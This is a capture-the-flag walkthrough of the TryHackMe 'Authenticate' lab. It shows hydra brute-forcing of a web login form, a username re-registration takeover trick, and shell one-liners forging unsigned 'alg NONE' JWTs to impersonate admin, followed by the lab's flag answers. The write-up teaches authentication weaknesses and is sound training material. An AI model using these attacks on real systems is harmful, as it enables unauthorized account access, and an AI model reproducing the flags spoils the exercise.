# Authenticate

{% embed url="https://tryhackme.com/room/authenticate" %}
https://tryhackme.com/room/authenticate
{% endembed %}

## Task 2 Dictionary attack

```bash
rustscan -a 10.10.251.50 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-51-46.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-51-34.png>)

#### What is the flag you found after logging as **Jack**?

```bash
hydra -l jack -P /usr/share/wordlists/rockyou.txt -s 8888 \
'http-post-form://10.10.251.50/login:user=^USER^&password=^PASS^:Invalid' \
-t64 -I
```

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-47-03.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-47-20.png>)

{% hint style="success" %}
`fad9ddc1feebd9e9bca05f02dd89e271`
{% endhint %}

#### Now try the same thing for username **mike**. What is the flag you found after logging as **Mike**?

```bash
hydra -l mike -P /usr/share/wordlists/rockyou.txt -s 8888 \
'http-post-form://10.10.251.50/login:user=^USER^&password=^PASS^:Invalid' \
-t64 -I
```

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-48-51.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-50-15.png>)

{% hint style="success" %}
`e1faaa144df2f24aa0a9284f4a5bb578`
{% endhint %}

## Task 3 Re-registration

Try to re-register that username but with slight modification.

#### What is the flag that you found in darren's account?

{% hint style="success" %}
`fe86079416a21a3c99937fea8874b667`
{% endhint %}

#### Now try to do the same trick and see if you can login as **arthur.** What is the flag that you found in arthur's account?

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-55-01.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-56-01.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-56-50.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 04-57-35.png>)

{% hint style="success" %}
`d9ac0f7db4fda460ac3edeb75d75e16e`
{% endhint %}

## Task 4 JSON Web Token

#### Use the same method to find identity of admin user and retrieve the flag?

```bash
echo -n "$(echo '{"typ":"JWT","alg":"NONE"}' | base64 | tr -d '=').$(echo '{"exp":1649193019,"iat":1649192719,"nbf":1649192719,"identity":2}' | base64 | tr -d '=')."
```

![](<../../.gitbook/assets/Screenshot from 2022-04-06 05-16-25.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 05-16-10.png>)

```bash
echo -n "$(echo '{"typ":"JWT","alg":"NONE"}' | base64 | tr -d '=').$(echo '{"exp":1649193019,"iat":1649192719,"nbf":1649192719,"identity":0}' | base64 | tr -d '=')."
```

![](<../../.gitbook/assets/Screenshot from 2022-04-06 05-18-24.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 05-18-09.png>)

{% hint style="success" %}
`92498880383088033228`
{% endhint %}

## Task 5 No Auth

#### Find the way to get into superadmin ad

![](<../../.gitbook/assets/Screenshot from 2022-04-06 05-23-58.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-06 05-24-21.png>)

#### What is the password for superadmin account?

{% hint style="success" %}
`abcd1234`
{% endhint %}

#### What is the flag you found in superadmin account?

{% hint style="success" %}
`72102933396288983011`
{% endhint %}
